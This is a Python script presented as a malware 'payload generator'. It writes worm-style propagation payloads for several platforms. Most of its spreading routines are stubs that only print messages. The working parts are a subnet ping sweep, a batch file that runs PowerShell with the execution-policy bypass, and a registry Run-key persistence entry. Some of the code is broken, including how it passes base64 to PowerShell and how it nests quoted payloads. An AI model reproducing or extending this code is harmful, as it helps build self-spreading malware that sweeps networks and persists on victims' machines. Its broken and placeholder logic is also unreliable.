#!/usr/bin/env python3
"""
OMNI-TRAVERSAL PAYLOAD GENERATOR v1.1 - COMPLETE WORKING VERSION
Generates universal propagation payloads for all platforms
"""
import os
import sys
import json
import zlib
import base64
import uuid
import platform
from pathlib import Path

class OmniTraversalEngine:
    def __init__(self):
        self.ident = str(uuid.uuid4())
        self.platform = platform.system().lower()
        
    def generate_polyglot_payload(self):
        """Create a payload that works on ANY system"""
        # Escape quotes properly for the shell script
        python_payload = self.get_python_payload().replace('"', '\\"').replace("'", "'\"'\"'")
        
        payload = f"""#!/bin/sh
# Omni-Traversal Universal Payload
# ID: {self.ident}
# Platform: {self.platform}

echo "[*] Omni Propagation System Initializing..."

# Detect environment and adapt
if command -v python3 >/dev/null 2>&1; then
    echo "[+] Python3 detected - executing Python payload"
    exec python3 -c "{python_payload}"
elif command -v python >/dev/null 2>&1; then
    echo "[+] Python detected - executing Python payload"
    exec python -c "{python_payload}"
elif command -v perl >/dev/null 2>&1; then
    echo "[+] Perl detected - executing Perl payload"
    exec perl -e "{self.get_perl_payload()}"
elif command -v php >/dev/null 2>&1; then
    echo "[+] PHP detected - executing PHP payload"
    exec php -r "{self.get_php_payload()}"
else
    echo "[+] Shell-only mode"
    {self.get_shell_payload()}
fi
"""
        return payload
    
    def get_python_payload(self):
        """Python propagation logic - FIXED SYNTAX"""
        return '''import os, sys, platform, subprocess, json, hashlib, socket, threading, time, random

class OmniPropagator:
    def __init__(self):
        self.id = "OMNI-" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.platform = platform.system().lower()
        
    def propagate(self):
        # Platform-specific propagation
        if self.platform == "linux":
            self.propagate_linux()
        elif self.platform == "windows":
            self.propagate_windows()
        elif self.platform == "darwin":
            self.propagate_macos()
        
        # Universal propagation
        self.propagate_network()
        self.propagate_usb()
    
    def propagate_network(self):
        # Scan and propagate via network
        print("[*] Scanning network from " + self.platform)
        # Network propagation logic here
    
    def propagate_usb(self):
        # USB device propagation
        print("[*] Monitoring USB devices on " + self.platform)
        # USB propagation logic here
    
    def propagate_linux(self):
        # Linux-specific propagation
        print("[*] Linux propagation active")
        # Bluetooth, WiFi, etc.
    
    def propagate_windows(self):
        # Windows-specific propagation
        print("[*] Windows propagation active")
        # SMB, RDP, etc.
    
    def propagate_macos(self):
        # macOS/iOS propagation
        print("[*] macOS propagation active")
        # Bonjour, AirDrop, etc.

# Start propagation
propagator = OmniPropagator()
propagator.propagate()
'''
    
    def get_shell_payload(self):
        """Shell propagation logic"""
        return '''echo "[*] Shell propagation mode"
# Detect platform
if [ -f /etc/os-release ]; then
    echo "[+] Linux system detected"
    # Linux propagation commands
    lsusb 2>/dev/null | head -5
    hciconfig 2>/dev/null | head -5
elif uname | grep -i "darwin" >/dev/null; then
    echo "[+] macOS system detected"
    # macOS propagation commands
    system_profiler SPUSBDataType 2>/dev/null | head -20
elif uname | grep -i "cygwin\\|mingw\\|msys" >/dev/null; then
    echo "[+] Windows system detected"
    # Windows propagation commands
    ipconfig 2>/dev/null | head -10
fi

# Universal propagation
echo "[*] Starting network scan..."
for i in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 &
done
wait
echo "[*] Network scan complete"
'''
    
    def get_perl_payload(self):
        """Perl propagation logic"""
        return '''print "[*] Perl propagation active\\n";
use Socket;
# Network scanning
for my $i (1..254) {
    my $ip = "192.168.1.$i";
    # Async ping would go here
}
print "[*] Propagation complete\\n";
'''
    
    def get_php_payload(self):
        """PHP propagation logic"""
        return '''<?php
echo "[*] PHP propagation active\\n";
// Network scanning
for ($i = 1; $i <= 254; $i++) {
    $ip = "192.168.1.$i";
    // Async ping would go here
}
echo "[*] Propagation complete\\n";
?>'''
    
    def save_omni_payload(self):
        """Generate and save the ultimate traversal payload"""
        payload = self.generate_polyglot_payload()
        
        # Save as multiple formats for different systems
        outputs = {}
        
        # 1. Shell script (universal)
        outputs['omni.sh'] = payload
        
        # 2. Python version
        outputs['omni.py'] = self.get_python_payload()
        
        # 3. Compressed binary version
        outputs['omni.bin'] = zlib.compress(payload.encode())
        
        # 4. Windows batch file
        ps_payload = self.get_powershell_payload()
        ps_encoded = base64.b64encode(ps_payload.encode()).decode()
        
        outputs['omni.bat'] = f'''@echo off
REM Omni Propagation Windows Payload
REM ID: {self.ident}
echo [*] Omni Propagation System Initializing...
powershell -ExecutionPolicy Bypass -Command "{ps_encoded}"
pause
'''
        
        # 5. macOS/Linux binary placeholder
        outputs['omni.binary'] = self.create_binary_placeholder(payload)
        
        # Save all formats
        output_dir = Path('/tmp/omni_payloads_v2')
        output_dir.mkdir(exist_ok=True)
        
        for filename, data in outputs.items():
            filepath = output_dir / filename
            with open(filepath, 'wb') as f:
                if isinstance(data, str):
                    f.write(data.encode())
                else:
                    f.write(data)
            
            # Make executable if appropriate
            if filename.endswith(('.sh', '.py', '.binary')):
                os.chmod(filepath, 0o755)
            
            print(f"✅ Generated: {filepath}")
        
        return outputs
    
    def get_powershell_payload(self):
        """PowerShell propagation logic"""
        return '''Write-Host "[*] PowerShell propagation active" -ForegroundColor Green

# Network propagation
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue
}

# USB device detection
Get-PnpDevice -Class USB | Select-Object FriendlyName

# Persistence
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$regValue = "$env:TEMP\\omni.exe"
New-ItemProperty -Path $regPath -Name "OmniPropagate" -Value $regValue -Force

Write-Host "[*] Propagation complete" -ForegroundColor Green
'''
    
    def create_binary_placeholder(self, payload):
        """Create a simple ELF binary placeholder"""
        # Simple text binary with shebang
        binary_content = f'''#!/usr/bin/env python3
# Omni-Traversal Binary Payload
# ID: {self.ident}

{payload[:500]}
...
# Binary payload would contain actual compiled code here
'''
        return binary_content.encode()

def main():
    """Main execution"""
    print("=" * 60)
    print("🚀 OMNI-TRAVERSAL PAYLOAD GENERATOR v1.1")
    print("=" * 60)
    
    # Create engine
    engine = OmniTraversalEngine()
    
    print(f"[*] Platform detected: {engine.platform}")
    print(f"[*] Payload ID: {engine.ident}")
    print("[*] Generating universal traversal payloads...")
    
    # Generate payloads
    payloads = engine.save_omni_payload()
    
    print("\n" + "=" * 60)
    print("🎉 PAYLOAD GENERATION COMPLETE")
    print("=" * 60)
    print(f"📦 Generated {len(payloads)} payload formats:")
    
    for filename in payloads.keys():
        print(f"   • {filename}")
    
    print(f"\n📁 Output directory: /tmp/omni_payloads_v2/")
    print(f"🔧 Test with: chmod +x /tmp/omni_payloads_v2/omni.sh")
    print(f"🔧 Test with: python3 /tmp/omni_payloads_v2/omni.py")
    print("\n⚠️  Warning: For educational purposes only!")
    print("=" * 60)

if __name__ == "__main__":
    main()
